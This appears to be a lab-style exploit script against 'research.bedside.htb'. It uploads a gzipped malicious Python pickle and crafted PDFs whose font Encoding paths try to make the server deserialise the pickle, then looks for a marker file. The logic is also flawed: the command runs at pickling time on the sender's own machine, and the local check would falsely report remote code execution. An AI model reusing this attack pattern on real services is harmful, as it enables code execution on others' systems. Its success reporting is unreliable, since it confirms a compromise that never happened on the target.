#!/usr/bin/env python3
import requests
import time
import gzip
import pickle

# Very simple RCE - just create a marker in /tmp
class RCE:
    def __reduce__(self):
        # Use os.system instead of subprocess to avoid pickle issues
        import os
        os.system('touch /tmp/bedside_pwned && echo SUCCESS > /tmp/bedside_pwned')
        return (lambda x: None, ())

payload = RCE()
pickled = pickle.dumps(payload)
pickle_gz = gzip.compress(pickled)

s = requests.Session()

# Upload pickle
print('[*] Uploading pickle...')
r = s.post('http://research.bedside.htb/',
           files={'uploadFile': ('pwn.pickle.gz', pickle_gz)})
print(f'Pickle: {r.status_code}')

# Upload PDFs with different path references
paths = ['pwn', 'uploads/pwn', '/uploads/pwn', '/tmp/uploads/pwn']

for path in paths:
    pdf_content = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources 5 0 R>>endobj
4 0 obj<</Length 20>>stream
BT /F1 12 Tf (X) Tj ET
endstream endobj
5 0 obj<</Font<</F1 6 0 R>>>>endobj
6 0 obj<</Type/Font/Subtype/Type0/BaseFont/F/Encoding{path}/DescendantFonts[7 0 R]>>endobj
7 0 obj<</Type/FontDescriptor/FontName/F>>endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000227 00000 n
0000000318 00000 n
0000000383 00000 n
0000000500 00000 n
trailer<</Size 8/Root 1 0 R>>startxref 580
%%EOF"""

    r = s.post('http://research.bedside.htb/',
               files={'uploadFile': (f'pwn_{path.replace("/", "_")}.pdf', pdf_content.encode())})
    print(f'PDF ({path}): {r.status_code}')

print('[*] Waiting for processing...')
time.sleep(3)

# Check if marker exists
try:
    with open('/tmp/bedside_pwned') as f:
        content = f.read()
        print(f'[!!!] RCE SUCCESSFUL! Content: {content}')
except FileNotFoundError:
    print('[-] Marker not found')

# Also try downloading our pickle via HTTP to see if it triggers processing
print('[*] Trying HTTP access to trigger processing...')
r = requests.get('http://research.bedside.htb/uploads/pwn.pickle.gz')
print(f'GET pwn.pickle.gz: {r.status_code}')

time.sleep(2)

try:
    with open('/tmp/bedside_pwned') as f:
        content = f.read()
        print(f'[!!!] RCE AFTER HTTP ACCESS! Content: {content}')
except FileNotFoundError:
    print('[-] Still no marker')
